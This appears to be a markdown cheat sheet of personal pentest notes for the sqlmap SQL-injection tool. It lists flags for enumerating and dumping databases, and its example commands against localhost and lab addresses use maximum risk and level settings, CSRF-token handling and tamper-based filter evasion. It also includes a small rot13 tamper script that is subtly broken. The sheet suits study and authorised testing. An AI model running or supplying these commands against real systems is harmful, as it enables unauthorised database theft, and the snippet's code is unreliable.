## SQLMap

### General

--wizard SQLmap in wizard mode

--flush-session Flush session files for current target

### Extracting Information

--dbs          Enumerate DBMS databases

--tables       Enumerate DBMS database tables

--dump         Dump DBMS database table entries

--dbms=SQLite  Select database type (e.g. "MySQL", "PostgreSQL", "Oracle", "Microsoft SQL Server")

--method POST

--level=LEVEL  Level of tests to perform (1-5, default 1)

--risk=RISK    Risk of tests to perform (1-3, default 1), Warning: Only use risk level 3 in test environment!

--technique=T  The selected SQL injection technique (e.g. B: Boolean-based blind, U: Union query-based, T: Time-based blind)

--proxy=PROXY  Use a proxy to connect to the target URL

### Examples

#### Common

`sqlmap --flush-session --wizard -u "http://10.10.10.1/index.php" --tables`

`sqlmap --flush-session -p name --method POST --data="name=&submit=submit" -u "http://127.0.0.1:8888/index.php" --tables -v 3 --risk=3 --level=5`

`sqlmap --flush-session -p name --method POST --data="name=&submit=submit" -u "http://127.0.0.1/index.php" --dump -v 3 --risk=3 --level=5 --technique=U`

#### CSRF Protection

`sqlmap --flush-session -p name --method POST --data='name=a&CSRFToken=y&submit=submit' -u 'http://localhost:8888/index.php' --tables -v 3 --risk=3 --level=5 --csrf-token='CSRFToken' --csrf-url='http://localhost:8888/index.php'`

#### Dinamic pages
 
--string=STRING     String to match when query is evaluated to True

--not-string=NOT..  String to match when query is evaluated to False

--regexp=REGEXP     Regexp to match when query is evaluated to True

`sqlmap --flush-session -p name --method POST --data='name=&submit=submit' -u 'http://127.0.0.1:8888/index.php' --dump -v 3 --risk=3 --level=5 --string=Query`

#### Evasion

--tamper="randomcase,space2comment"

`sqlmap --flush-session -p name --method POST --data='name=&submit=submit' -u 'http://127.0.0.1:8888/index.php' --dump -v 3 --risk=3 --level=5 --tamper=randomcase,space2comment`

#### Payload Processiong

We can create payload preprocessing scripts in the sqlmap/tamper directory (e.g. "/usr/share/sqlmap/tamper/rot13.py")

```
def tamper(payload, **kwargs):
    if payload:
        retVal = payload.encode('rot13')
    return retVal
```

`sqlmap -u http://127.0.0.1:8888/?order=description --tamper=rot13 --dbs --dbms=MySQL --technique=B --fresh-queries --keep-alive --threads=2 --no-cast`
